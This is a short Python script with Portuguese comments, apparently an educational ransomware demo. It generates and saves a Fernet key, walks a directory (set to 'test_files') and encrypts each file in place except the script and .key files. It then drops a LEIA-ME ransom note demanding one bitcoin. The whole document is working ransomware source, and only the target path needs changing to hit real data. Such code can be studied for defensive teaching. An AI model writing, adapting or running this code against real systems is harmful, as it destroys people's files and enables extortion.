# DA BIBLIOTECA CRYPTOGRAPHY, ESTAREMOS IMPORTANDO O MÓDULO "FERNET". RESPONSÁVEL POR CRIPTOGRAR E DESCRIPTOGRAFAR OS DADOS
from cryptography.fernet import Fernet 
# O MÓDULO "OS" SERVE PARA NAVEGAR PELAS PASTAS DO SISTEMA
import os

#1) GERAR UMA CHAVE DE CRIPTOGRAFIA E SALVAR
def Gerar_Chave():
    Chave = Fernet .generate_key()
    with open("chave.key", "wb") as Chave_File:
        Chave_File.write(Chave)

#2) CARREGAR A CHAVE SALVA
def Carregar_Chave():
    return open("chave.key", "rb").read()

#3) CRIPTOGRAFAR UM ÚNICO ARQUIVO
def Criptografar_Arquivo(Arquivo, Chave):
    f = Fernet(Chave)
    with open(Arquivo, "rb") as File: 
        Dados = File.read()
        Dados_Encriptados = f.encrypt(Dados)
        with open(Arquivo, "wb") as File: 
            File.write(Dados_Encriptados)

#4) ENCONTRAR ARQUIVOS PARA CRIPTOGRAFAR 
def Encontrar_Arquivos(Diretorio):
    Lista = []
    for Raiz, _, Arquivos in os.walk(Diretorio):
        for Nome in Arquivos: 
            Caminho = os.path.join(Raiz, Nome)
            if Nome != "ransoware.py" and not Nome.endswith(".key"):
                Lista.append(Caminho)
    return Lista

#5) MENSAGEM DE RESGATE
def Criar_Mensagem_Resgate(): 
    with open("LEIA-ME", "w") as f: 
        f.write("Seus arquivos foram criptografados!\n")
        f.write("Envie 1 bitcoin para o endereço X acompanhado do comprovante!\n")
        f.write("Depois disso, enviaremos a chave para você recuperar seus dados!\n")

#6) SEQUÊNCIA DE EXECUÇÃO
def main():
    Gerar_Chave()
    Chave = Carregar_Chave()
    Arquivos = Encontrar_Arquivos("test_files")
    for Arquivo in Arquivos:
        Criptografar_Arquivo(Arquivo, Chave)
    Criar_Mensagem_Resgate()
    print("Ransoware executado! Arquivos criptogtafados")

# SERVE PARA GARANTIR QUE SE O SCRIPT FOR EXECUTADO DIRETAMENTE, A FUNÇÃO "MAIN" SERÁ EXECUTADA
if __name__=="__main__":
    main()